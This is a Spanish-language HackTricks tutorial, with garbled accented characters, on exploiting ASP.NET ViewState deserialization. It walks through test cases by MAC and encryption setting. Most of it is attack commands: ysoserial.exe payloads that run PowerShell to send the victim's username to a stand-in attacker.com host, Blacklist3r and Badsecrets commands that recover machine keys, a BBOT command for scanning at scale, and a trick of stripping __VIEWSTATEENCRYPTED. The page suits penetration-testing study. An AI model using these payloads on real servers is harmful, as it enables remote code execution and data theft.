# Explotando \_\_VIEWSTATE sin conocer los secretos

<details>

<summary><strong>Aprende hacking en AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Experto en Equipos Rojos de HackTricks en AWS)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n [**art√≠culos oficiales de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Si est√°s interesado en una **carrera de hacking** y hackear lo imposible - **¬°estamos contratando!** (_se requiere dominio del polaco escrito y hablado_).

{% embed url="https://www.stmcyber.com/careers" %}

## ¬øQu√© es ViewState

**ViewState** sirve como mecanismo predeterminado en ASP.NET para mantener datos de p√°gina y control a trav√©s de p√°ginas web. Durante la renderizaci√≥n del HTML de una p√°gina, el estado actual de la p√°gina y los valores a preservar durante un postback se serializan en cadenas codificadas en base64. Estas cadenas se colocan en campos ViewState ocultos.

La informaci√≥n de ViewState puede caracterizarse por las siguientes propiedades o sus combinaciones:

- **Base64**:
- Este formato se utiliza cuando tanto los atributos `EnableViewStateMac` como `ViewStateEncryptionMode` est√°n establecidos en false.

- **Base64 + MAC (C√≥digo de Autenticaci√≥n de Mensajes) Habilitado**:
- La activaci√≥n de MAC se logra estableciendo el atributo `EnableViewStateMac` en true. Esto proporciona verificaci√≥n de integridad para los datos de ViewState.

- **Base64 + Encriptado**:
- La encriptaci√≥n se aplica cuando el atributo `ViewStateEncryptionMode` est√° establecido en true, asegurando la confidencialidad de los datos de ViewState.

## Casos de Prueba

La imagen es una tabla que detalla diferentes configuraciones para ViewState en ASP.NET basadas en la versi√≥n del framework .NET. Aqu√≠ tienes un resumen del contenido:

1. Para **cualquier versi√≥n de .NET**, cuando tanto MAC como Encriptaci√≥n est√°n deshabilitados, no se requiere un MachineKey, y por lo tanto no hay un m√©todo aplicable para identificarlo.

2. Para **versiones anteriores a 4.5**, si MAC est√° habilitado pero la Encriptaci√≥n no lo est√°, se requiere un MachineKey. El m√©todo para identificar el MachineKey se denomina "Blacklist3r".

3. Para **versiones anteriores a 4.5**, independientemente de si MAC est√° habilitado o no, si la Encriptaci√≥n est√° habilitada, se necesita un MachineKey. Identificar el MachineKey es una tarea para "Blacklist3r - Desarrollo Futuro".

4. Para **versiones 4.5 y superiores**, todas las combinaciones de MAC y Encriptaci√≥n (ya sea que ambos sean verdaderos, o uno sea verdadero y el otro falso) requieren un MachineKey. El MachineKey se puede identificar usando "Blacklist3r."


### Caso de Prueba: 1 ‚Äì EnableViewStateMac=false y viewStateEncryptionMode=false

Tambi√©n es posible deshabilitar completamente el ViewStateMAC configurando la clave del registro `AspNetEnforceViewStateMac` en cero en:
```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\.NETFramework\v{VersionHere}
```
**Identificaci√≥n de Atributos de ViewState**

Puedes intentar identificar si ViewState est√° protegido por MAC capturando una solicitud que contenga este par√°metro con BurpSuite. Si no se utiliza Mac para proteger el par√°metro, puedes explotarlo usando [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net)
```
ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName"
```
### Caso de prueba 1.5 ‚Äì Al igual que el Caso de prueba 1 pero la cookie ViewState no es enviada por el servidor

Los desarrolladores pueden **eliminar ViewState** para que no forme parte de una Solicitud HTTP (el usuario no recibir√° esta cookie).\
Uno podr√≠a asumir que si **ViewState** no est√° **presente**, su implementaci√≥n est√° **segura** de cualquier vulnerabilidad potencial relacionada con la deserializaci√≥n de ViewState.\
Sin embargo, esto no es cierto. Si **agregamos el par√°metro ViewState** al cuerpo de la solicitud y enviamos nuestra carga serializada creada usando ysoserial, a√∫n podremos lograr **ejecuci√≥n de c√≥digo** como se muestra en el **Caso 1**.


### Caso de prueba: 2 ‚Äì .Net < 4.5 y EnableViewStateMac=true & ViewStateEncryptionMode=false

Para **habilitar MAC de ViewState** para una **p√°gina espec√≠fica**, necesitamos realizar los siguientes cambios en un archivo aspx espec√≠fico:
```bash
<%@ Page Language="C#" AutoEventWireup="true" CodeFile="hello.aspx.cs" Inherits="hello" enableViewStateMac="True"%>
```
Tambi√©n podemos hacerlo para la aplicaci√≥n en general configur√°ndolo en el archivo **web.config** como se muestra a continuaci√≥n:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
<system.web>
<customErrors mode="Off" />
<machineKey validation="SHA1" validationKey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45" />
<pages enableViewStateMac="true" />
</system.web>
</configuration>
```
Como el par√°metro est√° protegido por MAC esta vez, para ejecutar con √©xito el ataque primero necesitamos la clave utilizada.

Puedes intentar usar [**Blacklist3r(AspDotNetWrapper.exe)**](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper) para encontrar la clave utilizada.
```
AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata /wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs= --decrypt --purpose=viewstate --modifier=6811C9FF --macdecode --TargetPagePath "/Savings-and-Investments/Application/ContactDetails.aspx" -f out.txt --IISDirPath="/"

--encrypteddata : __VIEWSTATE parameter value of the target application
--modifier : __VIWESTATEGENERATOR parameter value
```
[**Badsecrets**](https://github.com/blacklanternsecurity/badsecrets) es otra herramienta que puede identificar machineKeys conocidos. Est√° escrita en Python, por lo que a diferencia de Blacklist3r, no tiene dependencia de Windows. Para los viewstates de .NET, hay una utilidad "python blacklist3r", que es la forma m√°s r√°pida de usarla.

Puede ser suministrada con el viewstate y el generador directamente:
```
pip install badsecrets
git clone https://github.com/blacklanternsecurity/badsecrets
cd badsecrets
python examples/blacklist3r.py --viewstate /wEPDwUJODExMDE5NzY5ZGQMKS6jehX5HkJgXxrPh09vumNTKQ== --generator EDD8C9AE
```
![https://user-images.githubusercontent.com/24899338/227034640-662b6aad-f8b9-49e4-9a6b-62a5f6ae2d60.png](https://user-images.githubusercontent.com/24899338/227034640-662b6aad-f8b9-49e4-9a6b-62a5f6ae2d60.png)

O bien, puede conectarse directamente a la URL de destino e intentar extraer el viewstate del HTML:
```
pip install badsecrets
git clone https://github.com/blacklanternsecurity/badsecrets
cd badsecrets
python examples/blacklist3r.py --url http://vulnerablesite/vulnerablepage.aspx
```
![https://user-images.githubusercontent.com/24899338/227034654-e8ad9648-6c0e-47cb-a873-bf97623a0089.png](https://user-images.githubusercontent.com/24899338/227034654-e8ad9648-6c0e-47cb-a873-bf97623a0089.png)

Para buscar viewstates vulnerables a escala, en conjunto con la enumeraci√≥n de subdominios, se puede utilizar el m√≥dulo `badsecrets` de [**BBOT**](exploiting-\_\_viewstate-parameter.md):
```
bbot -f subdomain-enum -m badsecrets -t evil.corp
```
![https://user-images.githubusercontent.com/24899338/227028780-950d067a-4a01-481f-8e11-41fabed1943a.png](https://user-images.githubusercontent.com/24899338/227028780-950d067a-4a01-481f-8e11-41fabed1943a.png)

Si tienes suerte y encuentras la clave, puedes proceder con el ataque usando [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net)**:**
```
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName" --generator=CA0B0334 --validationalg="SHA1" --validationkey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45"

--generator = {__VIWESTATEGENERATOR parameter value}
```
En los casos en que el par√°metro `_VIEWSTATEGENERATOR` **no sea enviado** por el servidor, **no** necesitas **proporcionar** el par√°metro `--generator` **pero estos s√≠**:
```bash
--apppath="/" --path="/hello.aspx"
```
### Caso de prueba: 3 - .Net < 4.5 y EnableViewStateMac=true/false y ViewStateEncryptionMode=true

En este caso no se sabe si el par√°metro est√° protegido con MAC. Entonces, el valor probablemente est√© encriptado y **necesitar√°s la Machine Key para encriptar tu carga √∫til** y explotar la vulnerabilidad.

**En este caso el** [**m√≥dulo Blacklist3r**](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper) **est√° en desarrollo...**

**Antes de .NET 4.5**, ASP.NET puede **aceptar** un par√°metro \_`__VIEWSTATE`\_ **no encriptado** de los usuarios **incluso** si **`ViewStateEncryptionMode`** se ha establecido en _**Always**_. ASP.NET **solo verifica** la **presencia** del par√°metro **`__VIEWSTATEENCRYPTED`** en la solicitud. **Si se elimina este par√°metro y se env√≠a la carga √∫til no encriptada, a√∫n ser√° procesada.**

Por lo tanto, si los atacantes encuentran una forma de obtener la Machinekey a trav√©s de otra vulnerabilidad como la traves√≠a de archivos, el comando [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net) utilizado en el **Caso 2**, se puede utilizar para realizar RCE utilizando la vulnerabilidad de deserializaci√≥n de ViewState.

* Elimina el par√°metro `__VIEWSTATEENCRYPTED` de la solicitud para explotar la vulnerabilidad de deserializaci√≥n de ViewState; de lo contrario, devolver√° un error de validaci√≥n de MAC de ViewState y la explotaci√≥n fallar√°.

### Caso de prueba: 4 - .Net >= 4.5 y EnableViewStateMac=true/false y ViewStateEncryptionMode=true/false excepto ambos atributos a false

Podemos forzar el uso del framework ASP.NET especificando el siguiente par√°metro dentro del archivo web.config como se muestra a continuaci√≥n.
```xml
<httpRuntime targetFramework="4.5" />
```
Alternativamente, esto se puede hacer especificando la siguiente opci√≥n dentro del par√°metro `machineKey` del archivo web.config.
```bash
compatibilityMode="Framework45"
```
Como en el caso anterior, el **valor est√° encriptado.** Por lo tanto, para enviar un **payload v√°lido, el atacante necesita la clave**.

Puedes intentar usar [**Blacklist3r(AspDotNetWrapper.exe)**](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper) para encontrar la clave que se est√° utilizando:
```
AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata bcZW2sn9CbYxU47LwhBs1fyLvTQu6BktfcwTicOfagaKXho90yGLlA0HrdGOH6x/SUsjRGY0CCpvgM2uR3ba1s6humGhHFyr/gz+EP0fbrlBEAFOrq5S8vMknE/ZQ/8NNyWLwg== --decrypt --purpose=viewstate  --valalgo=sha1 --decalgo=aes --IISDirPath "/" --TargetPagePath "/Content/default.aspx"

--encrypteddata = {__VIEWSTATE parameter value}
--IISDirPath = {Directory path of website in IIS}
--TargetPagePath = {Target page path in application}
```
Para obtener una descripci√≥n m√°s detallada de IISDirPath y TargetPagePath, consulta [aqu√≠](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)

O, con [**Badsecrets**](https://github.com/blacklanternsecurity/badsecrets) (con un valor de generador):
```bash
cd badsecrets
python examples/blacklist3r.py --viewstate JLFYOOegbdXmPjQou22oT2IxUwCAzSA9EAxD6+305e/4MQG7G1v5GI3wL7D94W2OGpVGrI2LCqEwDoS/8JkE0rR4ak0= --generator B2774415
```
Una vez que se identifica una clave de M√°quina v√°lida, **el siguiente paso es generar un payload serializado usando** [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net)
```
ysoserial.exe -p ViewState  -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName" --path="/content/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="F6722806843145965513817CEBDECBB1F94808E4A6C0B2F2"  --validationalg="SHA1" --validationkey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45"
```
Si tienes el valor de `__VIEWSTATEGENERATOR`, puedes intentar **utilizar** el par√°metro `--generator` con ese valor y **omitir** los par√°metros `--path` y `--apppath`.

![](https://notsosecure.com/sites/all/assets/group/nss_uploads/2019/06/4.2.png)

Una explotaci√≥n exitosa de la vulnerabilidad de deserializaci√≥n de ViewState provocar√° una solicitud fuera de banda a un servidor controlado por el atacante, que incluye el nombre de usuario. Este tipo de exploit se demuestra en un concepto de prueba (PoC) que se puede encontrar a trav√©s de un recurso titulado "Explotando la deserializaci√≥n de ViewState usando Blacklist3r y YsoSerial.NET". Para m√°s detalles sobre c√≥mo funciona el proceso de explotaci√≥n y c√≥mo utilizar herramientas como Blacklist3r para identificar el MachineKey, puedes revisar el [PoC de Explotaci√≥n Exitosa](https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/#PoC) proporcionado.

### Caso de Prueba 6 ‚Äì Se est√° utilizando ViewStateUserKeys

La propiedad **ViewStateUserKey** se puede utilizar para **defenderse** contra un **ataque CSRF**. Si se ha definido una clave de este tipo en la aplicaci√≥n y tratamos de generar la carga √∫til de **ViewState** con los m√©todos discutidos hasta ahora, la **carga √∫til no ser√° procesada por la aplicaci√≥n**.\
Necesitas utilizar un par√°metro adicional para crear correctamente la carga √∫til:
```bash
--viewstateuserkey="randomstringdefinedintheserver"
```
### Resultado de una Explotaci√≥n Exitosa <a href="#poc" id="poc"></a>

Para todos los casos de prueba, si el payload ViewState de YSoSerial.Net funciona **exitosamente**, entonces el servidor responde con un ‚Äú**error interno del servidor 500**‚Äù teniendo como contenido de respuesta ‚Äú**La informaci√≥n de estado no es v√°lida para esta p√°gina y podr√≠a estar corrupta**‚Äù y obtenemos la solicitud OOB.

Consulte [m√°s informaci√≥n aqu√≠]([**https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/**](https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/))

## Referencias

* [**https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/**](https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/)
* [**https://medium.com/@swapneildash/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817**](https://medium.com/@swapneildash/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817)\\
* [**https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/**](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)
* [**https://blog.blacklanternsecurity.com/p/introducing-badsecrets**](https://blog.blacklanternsecurity.com/p/introducing-badsecrets)

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Si est√°s interesado en una **carrera de hacking** y hackear lo imposible - ¬°**estamos contratando!** (_se requiere fluidez en polaco escrito y hablado_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>Aprende hacking en AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
